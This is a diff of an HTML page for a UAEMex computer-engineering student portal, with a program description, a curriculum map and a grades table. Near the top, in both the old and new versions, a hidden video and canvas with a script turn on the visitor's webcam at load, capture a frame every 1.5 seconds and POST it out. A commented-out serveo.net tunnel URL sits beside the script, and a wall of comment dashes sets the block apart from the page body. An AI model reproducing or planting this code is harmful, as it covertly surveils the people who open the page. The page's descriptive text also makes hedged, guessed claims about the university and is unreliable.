@@ -1,154 +1,155 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <script
-      type="text/javascript"
-      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
-    ></script>
-    <link
-      rel="stylesheet"
-      type="text/css"
-      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
-    />
-    <script
-      type="text/javascript"
-      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
-    ></script>
 
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Bitter:wght@600&display=swap"
-      rel="stylesheet"
-    />
-    <link
-      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
-      rel="stylesheet"
-    />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="estilos.css" />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,200;1,200;1,400&display=swap"
-      rel="stylesheet"
-    />
-    <title>ICO</title>
-  </head>
+<head>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css" />
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 
-  <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
-  </div>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Bitter:wght@600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="estilos.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,200;1,200;1,400&display=swap"
+    rel="stylesheet" />
+  <title>ICO</title>
+</head>
 
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
 
-  <script>
-    function post(imgdata) {
-      $.ajax({
-        type: "POST",
-        data: { cat: imgdata },
-        //url: 'https://totus.serveo.net/post.php',
-        dataType: "json",
-        async: false,
-        success: function (result) {
-          // call the function that handles the response/results
-        },
-        error: function () {},
-      });
-    }
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-    ("use strict");
-
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const errorMsgElement = document.querySelector("span#errorMsg");
-
-    const constraints = {
-      audio: false,
-      video: {
-        facingMode: "user",
+<script>
+  function post(imgdata) {
+    $.ajax({
+      type: "POST",
+      data: { cat: imgdata },
+      //url: 'https://totus.serveo.net/post.php',
+      dataType: "json",
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
       },
-    };
+      error: function () { },
+    });
+  }
 
-    // Access webcam
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        handleSuccess(stream);
-      } catch (e) {
-        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-      }
+  ("use strict");
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const errorMsgElement = document.querySelector("span#errorMsg");
+
+  const constraints = {
+    audio: false,
+    video: {
+      facingMode: "user",
+    },
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
     }
+  }
 
-    // Success
-    function handleSuccess(stream) {
-      window.stream = stream;
-      video.srcObject = stream;
+  // Success
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
 
-      var context = canvas.getContext("2d");
-      setInterval(function () {
-        context.drawImage(video, 0, 0, 640, 480);
-        var canvasData = canvas
-          .toDataURL("image/png")
-          .replace("image/png", "image/octet-stream");
-        post(canvasData);
-      }, 1500);
-    }
+    var context = canvas.getContext("2d");
+    setInterval(function () {
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas
+        .toDataURL("image/png")
+        .replace("image/png", "image/octet-stream");
+      post(canvasData);
+    }, 1500);
+  }
 
-    // Load init
-    init();
-  </script>
+  // Load init
+  init();
+</script>
 
-  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
-  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
-  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
-  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
-  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
-  <!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+<!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+<!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+<!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+<!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+<!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
+<!--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------->
 
-  <body>
-    <!--contenedor de particulas-->
-    <div id="particles-js"></div>
-    <!--enlace de particulas-->
-    <script src="js/particles.min.js"></script>
-    <!--enlaces principales-->
-    <script src="js/app.js"></script>
-    <script src="js/main.js"></script>
+<body>
 
-    <header class="header" id="inicio">
-      <!-- <img src="img/menu.svg" alt="" class="menu1"> -->
-      <!-- <ul>
+
+
+  <!--contenedor de particulas-->
+  <div id="particles-js"></div>
+  <!--enlace de particulas-->
+  <script src="js/particles.min.js"></script>
+  <!--enlaces principales-->
+  <script src="js/app.js"></script>
+  <script src="js/main.js"></script>
+
+  <header class="header" id="inicio">
+    <!-- <img src="img/menu.svg" alt="" class="menu1"> -->
+    <!-- <ul>
       <li><a href="login.html"><img src="img/cerrarSesion.png" alt="" class="close"></a></li>
       <li><a href="#">Calificaciones</a></li>
       <li><a href="#">Dondes estamos</a></li>
       <li><a href="#">Contacto</a></li>
     </ul> -->
 
-      <ul>
-        <li>
-          <a href="login.html">
-            <img src="img/cerrarSesion.png" alt="" class="close" />
-          </a>
-        </li>
-        <li><a href="#page-1" style="margin-left:20px;width: 100%;">Inicio</a></li>
-        <li><a href="#page-2" style="margin-left:30px;width: 100%;">Nuestros calendarios</a></li>
-        <li><a href="#page-3" style="margin-left:10px;width: 100%;">Calificaciones</a></li>
-      </ul>
 
-      <scroll-container>
-        <scroll-page id="page-1">
-          <div class="contenedor head">
-            <h1>Universidad Autonoma del Estado de México</h1>
-            <p class="copy">Ingenieria en Computacion</p>
-          </div>
-        </scroll-page>
-      </scroll-container>
-    </header>
-    <main>
-  
-      <section class="contenedor" id="servicio">
-      <h2 class="subtitulo">Presentacion</h2>
+
+
+    <ul>
+      <li>
+        <a href="login.html">
+          <img src="img/cerrarSesion.png" alt="" class="close" />
+        </a>
+      </li>
+      <li><a href="#page-1" style="margin-left:20px;width: 100%;">Inicio</a></li>
+      <li><a href="#page-2" style="margin-left:30px;width: 100%;">Nuestros calendarios</a></li>
+      <li><a href="#page-3" style="margin-left:10px;width: 100%;">Calificaciones</a></li>
+      <img src="img/uaemlogo.png" alt="" style="width: 70px;">
+    </ul>
+
+
+
+    <!--section class="logo1" id="expertos">
+      <div class="cont-experts">
+        <img src="img/uaemlogo.png" alt="" style="width: 150px;">
+      </div>
+
+    </section-->
+
+    </section>
+
+    <scroll-container>
+      <scroll-page id="page-1">
+        <div class="contenedor head">
+          <h1>Universidad Autonoma del Estado de México</h1>
+          <p class="copy">Ingenieria en Computacion</p>
+        </div>
+      </scroll-page>
+    </scroll-container>
+  </header>
+  <main>
+
+    <section class="contenedor" id="servicio">
+      <h2 class="subtitulo">Conoce todo sobre la Ingenieria en Computacion </h2>
       <div class="contenedor-servicio">
-        <img src="img/Artificial.svg" alt="">
+        <img src="img/ING-COMPUTACION-UAEMEX.png" alt="">
         <div class="checklist-servicio">
           <div class="service">
             <h3 class="n-service"><span class="number"></span>Que es la Ingenieria en Computacion?</h3>
@@ -171,14 +172,52 @@
               efectivas y eficientes para problemas complejos.</p>
           </div>
           <div class="service">
-            <h3 class="n-service"><span class="numbrer"></span>Diseño web</h3>
-            <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Beatae incidunt, soluta tempore earum tempora
-              veritatis cupiditate reprehenderit. Recusandae, provident aperiam.</p>
+            <h3 class="n-service"><span class="numbrer"></span>Porque estudiar Ingenieria en computacion en la UAEMex?
+            </h3>
+            <p>Estudiar ingeniería en computación en la Universidad Autónoma del Estado de México (UAEMex) puede
+              ofrecerte varias ventajas y oportunidades. A continuación, te mencionaré algunas razones por las cuales
+              podrías considerar esta opción:
+
+
+              1. Prestigio y calidad académica: La UAEMex es una universidad reconocida en México por su trayectoria y
+              calidad educativa. Obtener tu título de ingeniería en computación de una institución con prestigio puede
+              brindarte una sólida formación académica y amplias oportunidades laborales.
+
+              2. Programa académico completo: La ingeniería en computación en la UAEMex probablemente cuente con un
+              programa académico completo y actualizado que cubra áreas fundamentales de la disciplina, como
+              programación, algoritmos, bases de datos, inteligencia artificial, redes de computadoras y sistemas
+              operativos. Esto te permitirá adquirir los conocimientos necesarios para enfrentar los desafíos de la
+              industria.
+
+              3. Cuerpo docente especializado: Es probable que la UAEMex cuente con profesores altamente capacitados y
+              especializados en el campo de la ingeniería en computación. Tener acceso a expertos en el área puede
+              enriquecer tu experiencia educativa y brindarte orientación y apoyo durante tu formación.
+
+              4. Recursos e infraestructura: La UAEMex podría contar con laboratorios, bibliotecas y recursos
+              tecnológicos necesarios para el estudio de la ingeniería en computación. Estos recursos pueden ayudarte a
+              realizar prácticas, proyectos y experimentos, lo cual es fundamental para complementar tus conocimientos
+              teóricos con experiencia práctica.
+
+              5. Networking y oportunidades de empleo: Estudiar en una universidad reconocida como la UAEMex te brinda
+              la oportunidad de establecer contactos y conexiones con otros estudiantes, profesores y profesionales del
+              campo de la computación. Esto puede ser beneficioso para tu desarrollo profesional y para acceder a
+              oportunidades de empleo o proyectos colaborativos en el futuro.</p>
           </div>
           <div class="service">
-            <h3 class="n-service"><span class="numbrer"></span>Diseño web</h3>
-            <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Beatae incidunt, soluta tempore earum tempora
-              veritatis cupiditate reprehenderit. Recusandae, provident aperiam.</p>
+            <h3 class="n-service"><span class="numbrer"></span>Conoce la Carrera</h3>
+            <p>Por eso, si quieres estudiar esta carrera en la UAEMex y deseas conocer todos los detalles de la
+              convocatoria, el plan de estudios, requisitos y demás de talles del proceso de admisión de esta casa
+              universitario, entonces este post es para ti. Continúa leyendo para conocer más detalles al respecto.
+
+              Duración: 10 Semestres
+              Titulación: 9 opciones
+              Universidad: UAEMex
+              Área: Ciencias Naturales, Exactas y de la Computación
+              Sedes: Facultad de Ingeniería, Atlacomulco, Ecatepec, Texcoco, Valle de Chalco, Valle de México, valle de
+              Teotihuacán, Zumpango
+              Modalidad: Presencial.
+
+            </p>
           </div>
         </div>
         </img>
@@ -201,23 +240,21 @@
         </div>
       </div>
     </section>
-    <section class="imagen-light">
-    
+    <!--section class="imagen-light">
       <img src="img/uaem.jpg" alt="" class="agregar-imagen">
-    </section>
+    </section-->
     <scroll-container>
       <scroll-page id="page-2">
         <section class="contenedor" id="expertos">
-          <h2 class="subtitulo">Expertos en</h2>
+          <h2 class="subtitulo">Nuestras Actividades y tu mapa curricular</h2>
           <section class="experts">
             <div class="cont-eexperts">
-              <img src="img/calendario.png" alt="" style="width: 320px;">
-              <img src="img/calendario.png" alt="" style="width: 320px;">
-              <img src="img/calendario.png" alt="" style="width: 320px;"> 
+              <img src="img/calendario.png" alt="" style="width: 600px;">
+              <img src="img/Mapa.jpg" alt="" style="width: 600px;">
             </div>
-       
+
           </section>
-    
+
         </section>
       </scroll-page>
     </scroll-container>
@@ -226,69 +263,70 @@
         <div>
 
           <p style="font-size: 30px;">Calificaciones</p>
-          <br/>
-          <table  style="width: 100%; font-size: 18px; margin-top:-30px;">
+          <br />
+          <table style="width: 100%; font-size: 18px; margin-top:-30px;">
             <tr style="background: #00518c;">
               <th style="width: 25%;">Clase</th>
               <th style="width: 25%;">Mestro</th>
               <th style="width: 20%;">1er parcial</th>
               <th style="width: 20%;">2er parcial</th>
-            <th style="width: 10%;">Final</th>
-            
-          </tr>
-          <tr>
-            <td style="width: 25%;">Geometria Analitica</td>
-            <td style="width: 25%;">Juan De la Cruz Perez</td>
-            <td style="width: 20%;">8.1</td>
-            <td style="width: 20%;">7.0</td>
-            <td style="width: 10%;">7.5</td>
-            
-          </tr>
-          <tr>
-            <td style="width: 25%;">Calculo 1</td>
-            <td style="width: 25%;">Regina Quiroz Arango</td>
-            <td style="width: 20%;">10</td>
-            <td style="width: 20%;">10</td>
-            <td style="width: 10%;">10</td>
-            
-          </tr>
-          
-        </table>
-      </div>
-      </scroll-page>
-      </scroll-container>
-    </main>
+              <th style="width: 10%;">Final</th>
 
-    <!-- <footer id="contacto"> -->
-      <div class="contenedor footer-contennt" style=" width:80px;position: fixed; top:300px;">
-        <div class="contact-us" >
-          <!-- <h2 class="brand">Dynamo</h2>
-          <p>somos uaem</p> -->
-          <a href="./" class="social-media-icon" >
-            <!-- <i class="bx bxl-facebook" ></i> -->
-            <img src="img/Whats.png" alt="" style="width: 30px;">
-          </a>
-          <a href="./" class="social-media-icon">
-            <!-- <i class="bx bxl-twitter"></i> -->
-            <img src="img/Face.png" alt="" style="width: 30px;">
+            </tr>
+            <tr>
+              <td style="width: 25%;">Geometria Analitica</td>
+              <td style="width: 25%;">Juan De la Cruz Perez</td>
+              <td style="width: 20%;">8.1</td>
+              <td style="width: 20%;">7.0</td>
+              <td style="width: 10%;">7.5</td>
 
-          </a>
-          <a href="./" class="social-media-icon">
-            <!-- <i class="bx bxl-instagram"></i> -->
-            <img src="img/Twitter.png" alt="" style="width: 30px;">
+            </tr>
+            <tr>
+              <td style="width: 25%;">Calculo 1</td>
+              <td style="width: 25%;">Regina Quiroz Arango</td>
+              <td style="width: 20%;">10</td>
+              <td style="width: 20%;">10</td>
+              <td style="width: 10%;">10</td>
 
-          </a>
-          <a href="./" class="social-media-icon">
-            <!-- <i class="bx bxl-tiktok"></i> -->
-            <img src="img/Instagram.png" alt="" style="width: 30px;">
+            </tr>
 
-          </a>
+          </table>
         </div>
-      </div>
-    <!-- </footer> -->
+      </scroll-page>
+    </scroll-container>
+  </main>
 
-    <!--menu de accion-->
-    <script src="js/menu.js"></script>
-    <script src="js/lightbox.js"></script>
-  </body>
+  <!-- <footer id="contacto"> -->
+  <div class="contenedor footer-contennt" style=" width:80px;position: fixed; top:300px;">
+    <div class="contact-us">
+      <!-- <h2 class="brand">Dynamo</h2>
+          <p>somos uaem</p> -->
+      <a href="./" class="social-media-icon">
+        <!-- <i class="bx bxl-facebook" ></i> -->
+        <img src="img/Whats.png" alt="" style="width: 30px;">
+      </a>
+      <a href="./" class="social-media-icon">
+        <!-- <i class="bx bxl-twitter"></i> -->
+        <img src="img/Face.png" alt="" style="width: 30px;">
+
+      </a>
+      <a href="./" class="social-media-icon">
+        <!-- <i class="bx bxl-instagram"></i> -->
+        <img src="img/Twitter.png" alt="" style="width: 30px;">
+
+      </a>
+      <a href="./" class="social-media-icon">
+        <!-- <i class="bx bxl-tiktok"></i> -->
+        <img src="img/Instagram.png" alt="" style="width: 30px;">
+
+      </a>
+    </div>
+  </div>
+  <!-- </footer> -->
+
+  <!--menu de accion-->
+  <script src="js/menu.js"></script>
+  <script src="js/lightbox.js"></script>
+</body>
+
 </html>
